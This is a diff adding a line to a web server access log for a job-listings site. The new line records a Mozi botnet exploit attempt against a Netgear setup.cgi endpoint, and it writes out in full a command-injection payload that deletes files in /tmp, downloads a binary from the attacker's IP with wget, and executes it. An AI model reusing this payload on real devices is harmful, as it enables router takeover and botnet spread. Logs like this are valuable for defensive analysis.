@@ -2361,3 +2361,4 @@
 192.168.32.1 - - [28/Sep/2020:21:34:18 +0000] "GET /css/style.css HTTP/1.0" 200 37197 "https://proger00.hopto.org/en/index.html" "Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0"
 192.168.32.1 - - [28/Sep/2020:21:34:18 +0000] "POST /api/get_vacations?position=%20&fleet=%20&countries=%20&salary_from=0&start_at=%20&end_at=0&sort=creation HTTP/1.0" 200 783 "https://proger00.hopto.org/en/index.html" "Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0"
 192.168.32.1 - - [28/Sep/2020:21:34:18 +0000] "GET /api/get_company_logo?email=niktob560@yandex.ru HTTP/1.0" 200 507394 "https://proger00.hopto.org/en/index.html" "Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0"
+112.249.195.231 - - [28/Sep/2020:21:37:53 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://112.249.195.231:46533/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 153 "-" "-"
